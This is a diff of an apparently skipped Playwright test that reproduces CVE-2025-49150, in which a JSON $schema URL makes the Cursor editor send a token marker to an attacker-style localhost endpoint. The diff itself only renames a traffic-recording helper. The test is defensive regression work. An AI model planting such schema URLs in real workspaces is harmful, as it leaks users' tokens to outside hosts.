@@ -24,7 +24,7 @@ import path from "node:path";
 import { expect } from "@playwright/test";
 
 import { test } from "../../harness/electron/fixtures/cursor-app.js";
-import { startMitmRecord } from "../../harness/observers/mitm-record.js";
+import { recordCursorTraffic } from "../../harness/observers/mitm-record.js";
 
 test.skip(
   "CVE-2025-49150: json.schemaDownload triggers outbound request to attacker-controlled URL",
@@ -37,7 +37,7 @@ test.skip(
     const attackerSchemaUrl = `http://localhost:9999/schema?token=${exfilMarker}`;
 
     // Start mitmdump to capture any outbound requests.
-    const mitm = await startMitmRecord(flowPath);
+    const mitm = await recordCursorTraffic(flowPath);
 
     try {
       // Write a JSON file with an attacker-controlled $schema URL into the workspace.
